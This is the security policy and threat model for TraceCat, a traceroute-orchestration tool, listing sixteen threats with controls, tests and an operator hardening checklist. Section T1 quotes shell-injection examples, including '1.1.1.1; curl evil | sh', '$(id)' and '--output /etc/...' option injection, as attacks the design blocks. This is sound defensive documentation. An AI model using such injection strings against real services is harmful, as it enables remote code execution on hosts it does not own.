# TraceCat Security Model

TraceCat executes traceroutes on remote vantage points. Its threat model is
built around one hard rule: **a remote caller must never be able to choose an
executable, an argument, a shell fragment, or an arbitrary network destination
that the administrator did not permit.** Everything else is layered on top of
that rule.

- Supported version: the current `main` branch / MVP `v0.1.x`.
- Report vulnerabilities privately to `admin@frank-ruan.com`. Please do not
  open a public issue for a security defect. Include a minimal reproduction and
  affected endpoints.
- No bug bounty is offered.

---

## 1. Assets and security goals

| Asset | Goal |
| --- | --- |
| Agent host | No arbitrary code execution, no privilege escalation, no shell |
| Internal networks | No SSRF/scanning through Agents; default-deny destination policy |
| Per-Agent credentials | Confidential, never logged, never sent to browsers |
| Dashboard/API | Authenticated, same-origin, CSRF-resistant, no permissive CORS |
| Collected trace data | Integrity-preserving; untrusted metadata never rendered as HTML |
| Availability | Bounded CPU/process/memory/DB usage; one bad node cannot fail a job |

## 2. Trust boundaries

```
[untrusted]                 [semi-trusted edge]        [trusted admin domain]
 Internet user ── TLS ──> Cloudflare Access edge ──> Controller ── tailnet ──> Agent ──> nexttrace
                              (identity provider)      (SQLite)                (host)
```

1. **Browser → Controller.** Untrusted input: every string, every JSON field,
   every header. Authenticated at the application boundary (Access JWT or local
   session), not just at the edge.
2. **Controller → Agent.** Trusted transport (WireGuard tailnet) but *not*
   trusted application identity: the Agent independently authenticates the
   Controller with a per-Agent bearer token and independently validates every
   field and the destination policy.
3. **Agent → NextTrace.** The most sensitive boundary. The only thing crossing
   it is a fixed executable path plus a strictly constructed `[]string` built
   from typed, validated values.
4. **NextTrace output → Controller/browser.** Untrusted data (network-derived
   strings, GeoIP/PTR/AS metadata). Sanitized, length-capped, stored as plain
   data, rendered as text only.
5. **DNS.** The Controller resolver is trusted for resolution (its answers are
   still policy-filtered); Agents never resolve hostnames for traces.
6. **Administrative configuration** (`/etc/tracecat/*.json`, env secrets,
   node URLs, allowlists) is trusted admin input, protected by file permissions
   and deployment hardening.

Out of scope assumptions: the host OS, systemd, the operator-chosen private
network/overlay, Cloudflare Access,
the operator-installed NextTrace binary and the DNS resolver are not
compromised; clocks are synchronized; administrators do not configure
`0.0.0.0/0`-style bypasses or expose the dev listener.

## 3. Threat model and controls

### T1. Remote code execution via the destination field
**Threat:** `1.1.1.1; curl evil | sh`, `$(id)`, backticks, newlines, URLs,
argument flags (`--help`, `--output /etc/...`).
**Controls:** destination is parsed by `netip.ParseAddr` only (numeric literal,
no zones, no brackets); no shell is ever used (`exec.CommandContext` on a fixed
binary); argv is built from a typed struct and asserted against an allowlist;
the target is always the last argument and is the canonical IP string; the
Controller additionally requires a prior `/resolve` flow and the Agent re-parses
and re-validates. `sh -c`, `bash -c`, `eval`, and dynamic command construction
do not exist in the codebase.
**Residual:** a compromised NextTrace binary is by definition code execution;
install it from a trusted source and pin/upgrade deliberately.

### T2. Argument / option injection
**Threat:** passing `-o /etc/...`, `-t` (MTR), `--deploy`, `--speed`, extra
tokens, a port range/service name, or a second positional target.
**Controls:** no user string ever reaches argv. Only fixed flags, bounded
integers converted with `strconv.Itoa`, the family flag derived from the parsed
address, and the canonical IP. Protocol is a fixed enum (`icmp`/`tcp`/`udp`)
mapped to capability-detected flags; TCP/UDP ports are validated integers in
`1..65535` (never strings, ranges or service names) and are forbidden for ICMP.
MTR/deploy/web-console modes are not implemented.

### T3. SSRF / internal network reconnaissance
**Threat:** tracing loopback, RFC1918, CGNAT, link-local (cloud metadata),
multicast, documentation/benchmark/reserved ranges, or IPv6 transition prefixes
that embed IPv4.
**Controls:** default-deny `ipguard` policy enforced independently by
Controller and Agent; only globally routable unicast (IPv4 unicast minus
special-use lists; IPv6 inside `2000::/3` minus known special-use prefixes) is
allowed. An explicit admin CIDR allowlist is the only bypass and default routes
are rejected at config load. DNS results are filtered before the user can
select them.

### T4. IPv4-mapped IPv6 policy bypass
**Threat:** `::ffff:127.0.0.1` or `::ffff:10.0.0.1` slipping past IPv4 checks.
**Controls:** addresses are unmapped before classification; the mapped form is
reduced to IPv4 and re-evaluated. Zone identifiers (`%eth0`) are rejected.
Covered by unit tests.

### T5. DNS rebinding / GeoDNS mismatch
**Threat:** a domain resolves to a public IP at approval time, then differently
at trace time; or an Agent's local resolver would see a different CDN edge.
**Controls:** resolution happens once, centrally; only the selected numeric IP
is dispatched; Agents never resolve hostnames; results display the exact IP.
The UI warns that CDN/GeoDNS paths may differ from local resolution.
**Residual:** the operator-selected IP is authoritative and may not match what
each Agent's own resolver would choose. This is disclosed by design; it is not
a vulnerability.

### T6. Agent impersonation / credential theft / MITM
**Threat:** another tailnet node calls the Agent; or the Controller's node token
leaks.
**Controls:** per-Agent high-entropy bearer token required on every request;
constant-time digest comparison; tokens only via environment variables named in
config, never logged, never stored in SQLite, never sent to browsers. The
operator's private overlay/VPC (e.g. WireGuard/Tailscale, no tags required)
restricts which host may reach the Agent port. Agents bind only to the
configured non-public address and refuse wildcard/missing/public addresses at
startup (public binds require an explicit opt-in and TLS/firewall).
**Residual:** a compromised Controller process or root on the Controller can
read configured tokens; rotate per-Agent tokens and use tailnet ACLs.

### T6b. Network overlay is not authentication
**Threat:** treating VPN/tailnet membership as authorization.
**Controls:** every Agent request still requires a per-Agent bearer token; the
overlay is only a transport/reachability control. TraceCat does not call a
Tailscale API, relies on no tags, and has no device-discovery/registration path.
**Residual:** a compromised host on the private network can reach the Agent
port, but cannot authenticate without the token.

### T7. Controller compromise via the web surface
**Threat:** auth bypass, CSRF, XSS, SQL injection, open redirect/proxy.
**Controls:** default-deny authentication middleware; Cloudflare Access JWT
signature/issuer/audience/expiry verification with JWKS rotation and optional
email allowlists; unverified identity headers are ignored; local auth uses
PBKDF2-HMAC-SHA256 (210k iterations) and server-side, revocable, HttpOnly,
SameSite=Strict session cookies (Secure on HTTPS origins); CSRF token bound to
the session plus Origin/`Sec-Fetch-Site` checks on state changes; strict JSON
schemas with unknown-field rejection and small body limits; no permissive CORS;
parameterized SQL; no user-supplied URLs or redirects; no file upload; CSP,
`nosniff`, `frame-ancestors 'none'`; no secrets or internal paths in responses
or the frontend bundle.
**Residual:** `local` mode is single-factor; put Cloudflare Access (with MFA)
in front of it for internet exposure. No multi-tenant authorization exists:
every authenticated user can trace every configured node.

### T8. Cloudflare Access JWT confusion
**Threat:** forged tokens, wrong audience/issuer, replayed expired tokens, or
spoofed identity headers (`Cf-Access-Authenticated-User-Email`).
**Controls:** RS256 signature verified against the team's JWKS fetched over
HTTPS from the configured team domain, `kid` selection, issuer/audience/exp/nbf
checks with 60s leeway, cached keys with rate-limited refresh; only the JWT
header/cookie is accepted; identity headers are never trusted; JWKS fetch is
bounded and body-capped. The app verifies tokens even though Cloudflare already
did, so a tunnel misconfiguration does not silently create an open proxy.
**Residual:** compromise of the Cloudflare team domain/JWKS is out of scope.

### T9. Stored/reflected XSS from NextTrace metadata
**Threat:** ASN organization, PTR, ISP, GeoIP, MPLS or raw error text containing
`<script>`, event handlers, or bidirectional/control characters.
**Controls:** every external string goes through `model.SanitizeText` (invalid
UTF-8 removed, control/format characters stripped, length-capped); data is
served as JSON and rendered with React text nodes only — `innerHTML`,
`dangerouslySetInnerHTML` and `eval` are forbidden; CSP disables inline scripts
and external script origins; no external fonts/CDNs/images.
**Residual:** visually deceptive but non-executable text remains possible.

### T10. Denial of service
**Threat:** expensive traces, request floods, oversized bodies/output,
connection exhaustion, DB growth.
**Controls:** per-Agent semaphore (concurrent trace processes), token-bucket
request limits per remote IP and globally, execution/probe timeouts, process
group kill, stdout cap (4 MiB) and stderr cap, 64 KiB Agent request bodies,
small Controller bodies, bounded worker pool and per-job concurrency, job rate
limits, response size limits, bounded history with trimming, SQLite state dir
0700, systemd `MemoryMax`/`LimitNOFILE`/`TasksMax`, HTTP server timeouts and
header caps.
**Residual:** authenticated users can still consume their rate-limited quota.

### T11. Secret leakage
**Threat:** tokens in logs, errors, API responses, metrics, frontend bundle,
git history.
**Controls:** tokens are referenced by env-var *name* in config; secrets are
never logged, never serialized, never returned; API errors use a fixed code +
sanitized message; no stack traces or filesystem paths leave the process;
frontend bundle contains no credentials or node IPs (nodes come from the
authenticated API); `.gitignore` covers env/local config; systemd env files are
0600.
**Residual:** local root/administrator can read environment files.

### T12. Process supervision escape / orphaned children
**Threat:** cancelled trace leaves NextTrace (or children) running; output
capture hangs.
**Controls:** `exec.CommandContext` with a dedicated execution context; Unix
process groups (`Setpgid`) and negative-PID kill on timeout/cancel, with a
`WaitDelay`/wait fallback; bounded capture writers; graceful shutdown cancels
in-flight work and reaps children; Agent runs unprivileged under a systemd
sandbox with only `CAP_NET_RAW`.

### T13. Static file traversal / API shadowing
**Threat:** path traversal in the embedded UI, directory listings, API routes
swallowed by SPA fallback.
**Controls:** `embed.FS` + `fs.Sub` + `path.Clean`; no directory listing; API
mux registered before the UI handler; unknown assets 404; SPA fallback only for
extension-less GET paths; HTML never cached; hashed assets cached immutably.

### T14. Open proxy / arbitrary Agent registration
**Threat:** making the Controller fetch or relay arbitrary URLs, or letting
users add nodes.
**Controls:** Agent endpoints are administrative configuration only; there is
no registration endpoint; user input never becomes a URL; outbound HTTP client
disables redirects and targets only configured Agent base URLs; no generic
"fetch URL" feature exists. Cleartext Agent URLs are only accepted for
non-public/Tailscale addresses.

### T15. Supply chain
**Threat:** compromised Go/npm dependencies or build artifacts.
**Controls:** minimal dependency set (Go stdlib + `x/net/idna` + pure-Go SQLite;
React/Vite/Tailwind at build time only), `go.sum` and `pnpm-lock.yaml` pinned,
Dependabot, CI typechecks/tests/builds, no postinstall-driven runtime, static
assets committed and regenerated deterministically.
**Residual:** upstream compromise of a pinned dependency remains possible;
review updates deliberately.

### T16. Dev-mode bypass exposure
**Threat:** `auth.mode=dev` deployed in production gives anonymous access.
**Controls:** dev mode is refused unless the listener host is loopback; requests
carrying proxy forwarding headers are rejected in dev mode; startup logs a
warning; documentation treats it as local-only.
**Residual:** a local process (or a loopback reverse proxy that strips headers)
could use dev mode. Never enable it on a shared host or behind a tunnel.

## 4. Explicit non-goals / accepted limitations

- **Single-tenant authorization:** authenticated users are trusted to use all
  configured nodes. There are no per-user node ACLs or roles.
- **No audit trail:** jobs are stored with the authenticated identity when
  available, but there is no tamper-evident audit log.
- **No persistence of in-flight jobs:** after a Controller restart, queued or
  running jobs are marked failed/abandoned rather than resumed.
- **Geolocation/ASN accuracy:** third-party GeoIP providers can be wrong or
  unavailable; the UI never fabricates missing data.
- **Intermediate timeouts:** routers commonly drop probes; the UI explicitly
  does not treat a missing intermediate hop as proof of a broken path.
- **Agent transport is cleartext HTTP inside the tailnet** (encrypted by
  WireGuard). Agents do not terminate TLS themselves in the MVP.
- **NextTrace is GPL-3.0 external software.** It is not vendored or modified;
  see `NOTICE`. Distributing a NextTrace binary alongside TraceCat (e.g. in a
  container) creates obligations under GPL-3.0 for that binary.
- **Built-in rate limits are in-memory** per Controller/Agent instance; they
  are not distributed across replicas.

## 5. Security testing

Automated tests (run with `go test -race ./...`) cover, among others:

- shell/argument injection attempts in target input (both layers);
- invalid IPv4/IPv6, zone identifiers, IPv4-mapped IPv6, private/link-local/
  multicast/reserved/documentation destinations;
- exact argv verification against a fake NextTrace binary, and proof that no
  shell is launched;
- multiple DNS results, IDN, dedupe/sort, resolution failures, policy filtering;
- unauthorized/malformed Agent requests, wrong tokens, node mismatch;
- malformed, oversized and truncated NextTrace JSON; nonzero exits;
- execution timeouts and process-group cancellation;
- concurrency and rate-limit exhaustion;
- Cloudflare Access JWT signature/issuer/audience/expiry failures;
- CSRF/Origin failures, session expiry, dev-mode proxy-header rejection;
- malicious HTML/control characters in ASN/PTR/GeoIP metadata;
- Controller partial-Agent failures, cancellation and bounded history.

See `docs/TESTING.md` for the exact commands and the verified test matrix.

## 6. Hardening checklist for operators

1. Run Agents unprivileged, grant only `CAP_NET_RAW` (ambient capability or
   `setcap cap_net_raw+ep` on the NextTrace binary), keep systemd sandboxing on.
   The Agent unit intentionally omits `MemoryDenyWriteExecute` because NextTrace
   v1.7.3 crashes under W^X; do not re-add it to the Agent unit.
2. Bind Agents only to an explicit private address (overlay/VPC/loopback);
   restrict reachability to the Controller host and the Agent port with
   firewall/security-group/overlay rules. No tags are needed.
3. Use a distinct random bearer token per Agent, 0600 env files, and rotate.
4. Put Cloudflare Access (MFA) in front of the Controller and use
   `auth.mode=cloudflare`; never expose `auth.mode=dev`.
5. Keep the Controller listener on loopback behind cloudflared; use HTTPS
   `public_origin` so cookies are Secure.
6. Install NextTrace from a trusted source, track CVEs, and upgrade
   deliberately; re-run capability detection (health endpoint) after upgrades.
7. Back up only if needed; the history is bounded and contains network metadata.
8. Monitor `429`/`503`/`target_rejected` responses and the Agent services.
